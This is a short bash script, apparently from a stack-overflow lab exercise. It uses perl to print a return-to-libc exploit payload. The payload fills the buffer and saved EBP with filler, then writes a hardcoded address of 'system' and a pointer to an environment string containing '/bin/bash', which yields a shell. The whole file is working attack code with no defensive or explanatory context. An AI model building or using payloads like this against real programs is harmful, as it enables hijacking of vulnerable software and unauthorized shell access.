#!/bin/bash

# write garbage to buff
perl -e 'print "XXXX";'

# overwrite saved EBP
perl -e 'print "XXXX";'

# write the address of "system" function call to replace the old return address
#perl -e 'print "\x80\xad\x07\x40";'
perl -e 'print "\x80\xad\x07\x40";'

# write a fake return address for the "system" function, it is not used
perl -e 'print "XXXX";'

# write the address of environment variable string that has "/bin/bash"
#perl -e 'print "\x2a\xf3\xff\xbf";'
perl -e 'print "\x31\xf3\xff\xbf";'
